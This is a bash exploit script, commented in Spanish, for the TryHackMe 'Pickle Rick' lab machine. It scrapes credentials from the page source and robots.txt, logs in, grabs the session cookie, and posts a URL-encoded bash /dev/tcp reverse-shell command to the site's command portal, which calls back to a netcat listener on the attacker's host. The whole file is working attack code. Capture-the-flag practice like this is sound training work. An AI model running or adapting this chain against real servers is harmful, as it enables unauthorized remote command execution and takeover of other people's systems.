#!/bin/bash
# Plataforma: TryHackMe
# Maquina: Pickle Rick


clear
if [ $# -ne 1 ];then

	echo -e "\n[*] Example: $0 10.10.10.0"
else

	echo -e "\n"
	read -p "[+] Introduce la IP: " ip
	read -p "[+]Introduce el puerto: " port

	echo -e "\n[!] Ponte en escucha nc -nlvp $port"

	#Recoleccion de usuario/password
	username=$(/usr/bin/curl -s http://$1 | grep "Username" | /usr/bin/awk '{print $2}')
	password=$(/usr/bin/curl -s http://$1/robots.txt)

	echo -e "\n[+] Crewdenciales encontradas: $username:$password"
	/usr/bin/sleep 1

	# Login
	echo "[*] Accediendo al panel de control."
	/usr/bin/curl -s http://$1/login.php -d "username=$username&password=$password&sub=Login"
	cookie=$(/usr/bin/curl -i -s -X POST http://$1/login.php -d "username=$username&password=$password&sub=Login" | grep "Set-Cookie:" | /usr/bin/awk '{print $2}' | /usr/bin/tr -d ';')
	/usr/bin/sleep 1

	# Ejecucion Comandos
	echo "[!] Ejecutando reverse shell."
	/usr/bin/curl -i -s -k -X POST \
	    -b "$cookie" \
	    --data-binary 'command=bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F'$ip'%2F'$port'+0%3E%261%22&sub=Execute' \
	    "http://$1/portal.php" &>/dev/null

fi